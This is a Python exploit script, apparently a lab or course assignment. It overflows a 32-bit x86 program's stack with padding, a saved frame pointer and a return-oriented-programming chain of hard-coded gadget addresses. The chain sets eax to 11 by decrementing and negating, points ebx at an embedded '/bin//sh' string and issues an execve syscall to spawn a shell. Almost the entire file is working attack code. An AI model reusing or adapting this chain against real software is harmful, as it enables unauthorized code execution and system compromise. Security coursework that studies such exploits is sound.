#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
#clear eax 80697ef 
#push eax 808258c
#move (esp) to eax 8049328
#esp += 2c 804993a
#eax = ffffffff   807b6cd
#eax = -eax  80607e7
#decrement eax 80628b3
#pop ebx 8062946
#pop ebx, ecx, edx 806de71
#move eax to edx with side effects 804ffe2
#clear ecx and syscall 806e211
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(pack("<B", 0x33))
for i in range(19):
	sys.stdout.buffer.write(pack("<I", 0x33333333))

sys.stdout.buffer.write(pack("<I", 0xfffed98c))# set ebp when leave

sys.stdout.buffer.write(pack("<I", 0x080697ef))# clear eax
 
sys.stdout.buffer.write(pack("<I", 0x0804ffe2))# set edx to 0 with side effects
sys.stdout.buffer.write(pack("<I", 0xfffed98c))#pop ebx points to "/bin/sh"
sys.stdout.buffer.write(pack("<I", 0x33333333))#pop esi dont care
sys.stdout.buffer.write(pack("<I", 0x33333333))#pop edi
sys.stdout.buffer.write(pack("<I", 0x33333333))#pop ebp

#sys.stdout.buffer.write(pack("<I", 0x0807b6cd))# 
sys.stdout.buffer.write(pack("<I", 0x080628b3))# decrement eax 11 times
sys.stdout.buffer.write(pack("<I", 0x080628b3))# 
sys.stdout.buffer.write(pack("<I", 0x080628b3))# 
sys.stdout.buffer.write(pack("<I", 0x080628b3))# 
sys.stdout.buffer.write(pack("<I", 0x080628b3))# 
sys.stdout.buffer.write(pack("<I", 0x080628b3))# 
sys.stdout.buffer.write(pack("<I", 0x080628b3))# 
sys.stdout.buffer.write(pack("<I", 0x080628b3))# 
sys.stdout.buffer.write(pack("<I", 0x080628b3))# 
sys.stdout.buffer.write(pack("<I", 0x080628b3))# 
sys.stdout.buffer.write(pack("<I", 0x080628b3))# 

sys.stdout.buffer.write(pack("<I", 0x080607e7))# negate eax
# eax=11
sys.stdout.buffer.write(pack("<I", 0x0806e211))# clear ecx and syscall
sys.stdout.buffer.write(pack("<I", 0x77777777))#
sys.stdout.buffer.write(pack(">I", 0x2f62696e))#/bin
sys.stdout.buffer.write(pack(">I", 0x2f2f7368))#//sh



#sys.stdout.buffer.write(pack("<I", 0x0806969e))#return 1

#sys.stdout.buffer.write(pack("<I", 0x55555555))# esp before int x80
#sys.stdout.buffer.write(pack("<I", 0x77777777))#return 2

#sys.stdout.buffer.write(pack("<I", 0x08049328))#return 2
